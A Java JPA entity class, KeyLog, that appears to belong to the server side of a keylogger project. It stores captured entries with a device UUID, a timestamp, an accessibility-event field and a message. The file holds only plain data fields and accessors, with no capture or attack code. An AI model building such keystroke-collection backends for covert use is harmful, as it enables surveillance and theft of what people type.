package com.maemresen.infsec.keylogweb.entity;

import com.maemresen.infsec.keylogweb.model.KeyLogModel;

import javax.persistence.Entity;
import javax.persistence.GeneratedValue;
import javax.persistence.GenerationType;
import javax.persistence.Id;
import java.util.Date;

/**
 * @author Emre Sen - 14.05.2019
 * @contact maemresen07@gmail.com
 */
@Entity
public class KeyLog {

    @Id
    @GeneratedValue(strategy = GenerationType.SEQUENCE)
    private int id;

    private String uuid;
    private Date keyLogDate;
    private String accessibilityEvent;
    private String msg;

    public KeyLog(){

    }

    public KeyLog(KeyLogModel keyLogModel) {
        this.uuid = keyLogModel.getUuid();
        this.keyLogDate = keyLogModel.getKeyLogDate();
        this.accessibilityEvent = keyLogModel.getAccessibilityEvent();
        this.msg = keyLogModel.getMsg();
    }

    public int getId() {
        return id;
    }

    public void setId(int id) {
        this.id = id;
    }

    public String getUuid() {
        return uuid;
    }

    public void setUuid(String uuid) {
        this.uuid = uuid;
    }

    public Date getKeyLogDate() {
        return keyLogDate;
    }

    public void setKeyLogDate(Date keyLogDate) {
        this.keyLogDate = keyLogDate;
    }

    public String getAccessibilityEvent() {
        return accessibilityEvent;
    }

    public void setAccessibilityEvent(String accessibilityEvent) {
        this.accessibilityEvent = accessibilityEvent;
    }

    public String getMsg() {
        return msg;
    }

    public void setMsg(String msg) {
        this.msg = msg;
    }
}
